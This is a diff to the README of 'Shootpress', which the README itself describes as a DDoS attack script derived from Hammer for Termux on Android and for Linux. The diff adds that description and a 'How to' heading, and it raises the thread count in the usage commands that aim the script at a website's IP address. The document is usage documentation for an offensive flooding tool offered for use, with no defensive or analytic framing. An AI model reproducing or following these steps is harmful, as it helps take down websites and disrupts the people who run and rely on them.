@@ -1,3 +1,8 @@
+Shootpress is a script that functions as a tool in carrying out DDoS attacks that are developed based on Hammer. This script can run on Android using Termux, and can also run on Linux devices.
+
+Hope you can use this script wisely.
+
+<b>How to:</b>
 $ apt update<br>
 $ apt upgrade<br>
 $ apt install python<br>
@@ -12,6 +17,6 @@ Note the IP Address of that Website<br>
 
 then <br>
 $ cd Shootpress<br>
-$ python shootpress.py -s [ip Address] -t 135<br>
+$ python shootpress.py -s [ip Address] -t 150<br>
 example:<br>
-$ python shootpress.py -s 123.45.67.89 -t 135<br>
+$ python shootpress.py -s 123.45.67.89 -t 150<br>
